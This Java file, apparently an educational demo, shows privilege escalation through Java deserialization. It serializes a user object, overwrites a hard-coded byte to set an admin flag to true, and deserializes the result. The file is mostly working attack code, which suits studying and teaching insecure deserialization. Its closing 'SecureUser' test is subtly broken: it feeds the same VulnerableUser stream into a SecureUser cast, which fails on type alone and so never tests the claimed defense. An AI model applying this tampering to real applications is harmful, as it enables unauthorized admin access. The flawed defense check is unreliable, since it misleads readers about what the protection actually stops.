import java.io.*;

public class Exploit {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 1. Demonstrate legitimate user creation (non-admin)
        VulnerableUser regularUser = new VulnerableUser("legituser", false);
        System.out.println("Legitimate user created via constructor: " + regularUser);

        // 2. Attacker's part: Create a serialized VulnerableUser object with isAdmin=false,
        // then modify the byte array to set isAdmin=true.

        // Create a VulnerableUser object that is initially not an admin
        VulnerableUser userToExploit = new VulnerableUser("attacker", false);

        // Serialize this object
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(userToExploit);
        oos.close();
        byte[] serializedData = baos.toByteArray();

        // --- Manual Byte Manipulation (Simulating Attacker) ---
        // The goal is to change the 'isAdmin' boolean field from false (0x00) to true (0x01).
        // Based on inspection of serialized data for VulnerableUser("attacker", false):
        // The boolean 'isAdmin' (false) is represented by a single byte 0x00.
        // The field order in the class descriptor is 'isAdmin' then 'username'.
        // The value for 'isAdmin' is serialized after the class descriptor and field definitions.
        // For VulnerableUser("attacker", false), the 'isAdmin' boolean value (0x00) is at index 49.
        // This index can be brittle and may change with different JVMs or class modifications.
        int booleanByteIndex = 49; 

        if (booleanByteIndex < serializedData.length) {
            serializedData[booleanByteIndex] = 0x01; // Change false (0x00) to true (0x01)
            System.out.println("Modified serialized byte at index " + booleanByteIndex + " to set isAdmin=true.");
        } else {
            System.out.println("Could not find a suitable byte to modify. Exploit might fail.");
        }

        System.out.println("\nAttempting to deserialize malicious object...");

        // 3. Deserialize the modified byte stream as VulnerableUser.
        // The VulnerableUser's readObject() method does not re-validate, so it will accept
        // the manipulated 'isAdmin' flag.
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bais);

        VulnerableUser deserializedMaliciousUser = (VulnerableUser) ois.readObject();
        ois.close();

        System.out.println("Deserialized malicious user: " + deserializedMaliciousUser);

        if (deserializedMaliciousUser.isAdmin()) {
            System.out.println("\n!!! EXPLOIT SUCCESSFUL: 'attacker' user is now an administrator due to deserialization vulnerability !!!");
        } else {
            System.out.println("Exploit failed: isAdmin is still false or username corrupted.");
        }

        // 4. Demonstrate SecureUser (should prevent the exploit)
        System.out.println("\n--- Testing SecureUser ---");
        SecureUser secureRegularUser = new SecureUser("legituser", false);
        System.out.println("Legitimate secure user created via constructor: " + secureRegularUser);

        // Attempt to deserialize the *same* malicious byte stream as SecureUser
        ByteArrayInputStream baisSecure = new ByteArrayInputStream(serializedData);
        ObjectInputStream oisSecure = new ObjectInputStream(baisSecure);

        try {
            SecureUser deserializedSecureMaliciousUser = (SecureUser) oisSecure.readObject();
            System.out.println("Deserialized malicious secure user: " + deserializedSecureMaliciousUser);
            if (deserializedSecureMaliciousUser.isAdmin()) {
                System.out.println("SecureUser exploit FAILED: 'attacker' user is an administrator.");
            } else {
                System.out.println("SecureUser successfully prevented privilege escalation (isAdmin is false).");
            }
        } catch (IllegalArgumentException e) {
            System.out.println("SecureUser successfully prevented exploit during deserialization: " + e.getMessage());
        } catch (Exception e) {
            System.out.println("An unexpected error occurred during SecureUser deserialization: " + e.getMessage());
        }
        oisSecure.close();
    }
}

